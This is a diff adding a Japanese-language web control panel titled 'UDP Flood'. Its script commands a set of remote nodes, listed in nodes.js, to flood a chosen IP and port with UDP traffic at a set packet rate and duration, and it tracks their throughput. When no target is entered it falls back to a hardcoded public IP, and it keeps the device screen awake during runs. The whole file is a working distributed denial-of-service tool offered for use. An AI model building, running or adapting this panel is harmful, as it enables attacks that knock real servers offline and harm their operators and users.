@@ -1,1 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>flood</title>
+<style>
+  body{font-family:system-ui;background:#0b0e14;color:#d7dce5;padding:16px;max-width:520px;margin:auto}
+  input,button{width:100%;padding:11px;margin:5px 0;border-radius:8px;border:1px solid #2a3140;background:#141924;color:#d7dce5;font-size:15px;box-sizing:border-box}
+  button{background:#2563eb;border:0;font-weight:700;cursor:pointer}
+  button.stop{background:#dc2626}
+  .row{display:flex;gap:8px}
+  .row>*{flex:1}
+  .box{background:#141924;border:1px solid #2a3140;border-radius:10px;padding:12px;margin-top:12px;font-size:14px;line-height:1.7}
+  .n{font-variant-numeric:tabular-nums}
+  .ok{color:#4ade80}.ng{color:#f87171}
+</style>
+</head>
+<body>
+<h3>UDP Flood</h3>
 
+<input id="ip" placeholder="IP（空でも撃てる）">
+<div class="row">
+  <input id="port" placeholder="port" value="9339">
+  <input id="dur" placeholder="秒" value="300">
+</div>
+<input id="pps" placeholder="合計pps" value="20000">
+<button id="go">START</button>
+<button id="stop" class="stop">STOP</button>
+
+<div class="box">
+  <div>合計 <span id="tpps" class="n">0</span> pps / <span id="tmbps" class="n">0</span> Mbps</div>
+  <div id="nodes"></div>
+</div>
+
+<script src="nodes.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+let timer = null, running = false;
+
+function render() {
+  $('nodes').innerHTML = NODES.map((n, i) =>
+    `<div><span id="s${i}" class="ng">●</span> ${n.replace(/^https?:\/\//,'')} ` +
+    `<span id="p${i}" class="n">0</span> pps</div>`
+  ).join('');
+}
+
+async function health() {
+  await Promise.allSettled(NODES.map(async (n, i) => {
+    try {
+      const r = await fetch(n + '/health', { cache: 'no-store' });
+      $(`s${i}`).className = r.ok ? 'ok' : 'ng';
+    } catch { $(`s${i}`).className = 'ng'; }
+  }));
+}
+
+async function poll() {
+  let tp = 0, tm = 0;
+  await Promise.allSettled(NODES.map(async (n, i) => {
+    try {
+      const d = await (await fetch(n + '/stat', { cache: 'no-store' })).json();
+      $(`p${i}`).textContent = d.pps || 0;
+      tp += d.pps || 0;
+      tm += d.mbps || 0;
+    } catch { $(`p${i}`).textContent = '0'; }
+  }));
+  $('tpps').textContent = tp;
+  $('tmbps').textContent = tm.toFixed(1);
+}
+
+$('go').onclick = async () => {
+  if (running) return;
+  const ip = $('ip').value.trim() || '52.33.95.61';
+  const port = $('port').value, dur = $('dur').value;
+  const per = Math.min(20000, Math.max(1, Math.floor(Number($('pps').value) / NODES.length)));
+
+  running = true;
+  await health();
+
+  await Promise.allSettled(NODES.map(n =>
+    fetch(`${n}/start?ip=${encodeURIComponent(ip)}&port=${port}&pps=${per}&dur=${dur}`)
+      .catch(() => {})
+  ));
+
+  clearInterval(timer);
+  timer = setInterval(poll, 1000);
+  setTimeout(() => { clearInterval(timer); running = false; poll(); }, Number(dur) * 1000 + 2000);
+};
+
+$('stop').onclick = async () => {
+  clearInterval(timer); running = false;
+  await Promise.allSettled(NODES.map(n => fetch(n + '/stop').catch(() => {})));
+  poll();
+};
+
+let wl = null;
+async function keepAwake() {
+  try { wl = await navigator.wakeLock.request('screen'); } catch {}
+}
+document.addEventListener('click', keepAwake, { once: true });
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible') keepAwake();
+});
+
+render();
+health();
+setInterval(() => { if (!running) health(); }, 15000);
+</script>
+</body>
+</html>
